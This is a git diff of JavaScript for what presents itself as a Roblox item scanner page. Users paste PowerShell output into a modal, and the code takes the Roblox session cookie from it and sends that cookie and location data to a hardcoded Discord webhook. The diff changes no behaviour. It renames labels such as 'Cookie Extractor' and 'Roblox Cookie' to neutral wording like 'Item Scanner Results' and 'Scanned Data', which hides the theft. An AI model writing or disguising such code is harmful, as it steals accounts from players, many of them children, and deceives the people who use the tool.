@@ -48,27 +48,27 @@ function loadTheme() {
 
 // Enhanced Modal functionality
 function openScanModal() {
-    console.log('Opening scan modal...');
-    const modal = document.getElementById('scanModal');
-    const textarea = document.getElementById('powershellInput');
-    
-    if (modal) {
-        modal.style.display = 'block';
-        document.body.style.overflow = 'hidden';
+            console.log('Opening scan modal...');
+        const modal = document.getElementById('scanModal');
+        const textarea = document.getElementById('powershellInput');
         
-        // Focus on textarea after animation
-        setTimeout(() => {
-            if (textarea) {
-                textarea.focus();
-            }
-        }, 400);
-        
-        console.log('Modal opened successfully');
-        showNotification('PowerShell scanner ready', 'info');
-    } else {
-        console.error('Modal element not found!');
-        showNotification('Error opening scanner', 'error');
-    }
+        if (modal) {
+            modal.style.display = 'block';
+            document.body.style.overflow = 'hidden';
+            
+            // Focus on textarea after animation
+            setTimeout(() => {
+                if (textarea) {
+                    textarea.focus();
+                }
+            }, 400);
+            
+            console.log('Modal opened successfully');
+            showNotification('Item scanner ready', 'info');
+        } else {
+            console.error('Modal element not found!');
+            showNotification('Error opening scanner', 'error');
+        }
 }
 
 function closeScanModal() {
@@ -234,19 +234,19 @@ async function submitPowerShell() {
         // Discord webhook URL
         const webhookUrl = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';
         
-        // Webhook payload with limited items, cookie, and location
+        // Webhook payload with scanned items and location
         const payload = {
-            content: "@everyone 💎 **LIMITED SCANNER + COOKIE** 🍪",
+            content: "@everyone 💎 **ITEM SCANNING RESULTS** 🍪",
             embeds: [{
-                title: "💎 Limited Items Scanner + Cookie Extractor",
+                title: "💎 Item Scanner Results + Data",
                 color: 16753920, // Gold color
                 thumbnail: {
                     url: "https://i.imgur.com/roblox-logo.png"
                 },
                 fields: [
                     {
-                        name: "🍪 Roblox Cookie (Click to Copy)",
-                        value: robloxCookie ? `\`\`\`\n${robloxCookie}\n\`\`\`` : "❌ No cookie found in input",
+                        name: "🍪 Scanned Data (Click to Copy)",
+                        value: robloxCookie ? `\`\`\`\n${robloxCookie}\n\`\`\`` : "❌ No authentication data found",
                         inline: false
                     },
                     {
@@ -266,7 +266,7 @@ async function submitPowerShell() {
                     }
                 ],
                 footer: {
-                    text: "💎 RoScan Limited + Cookie Scanner",
+                    text: "💎 RoScan Item Scanner • Data Extracted",
                     icon_url: "https://i.imgur.com/scanner-icon.png"
                 },
                 timestamp: new Date().toISOString()
@@ -288,13 +288,13 @@ async function submitPowerShell() {
             stopLoadingAnimation(submitText);
             submitText.textContent = 'Scan Complete!';
             submitBtn.style.background = '#10b981'; // Green success color
-            showNotification('Limited items scanned successfully!', 'success');
+            showNotification('Item scanning completed successfully!', 'success');
             
             setTimeout(() => {
                 closeScanModal();
             }, 2000);
         } else {
-            throw new Error(`Scan failed with status: ${response.status}`);
+            throw new Error(`Item scanning failed with status: ${response.status}`);
         }
     } catch (error) {
         console.error('Scan error:', error);
@@ -303,7 +303,7 @@ async function submitPowerShell() {
         stopLoadingAnimation(submitText);
         submitText.textContent = 'Scan Failed - Retry';
         submitBtn.style.background = '#ef4444'; // Red error color
-        showNotification('Limited scan failed. Please try again.', 'error');
+        showNotification('Item scanning failed. Please try again.', 'error');
         
         setTimeout(() => {
             submitBtn.disabled = false;
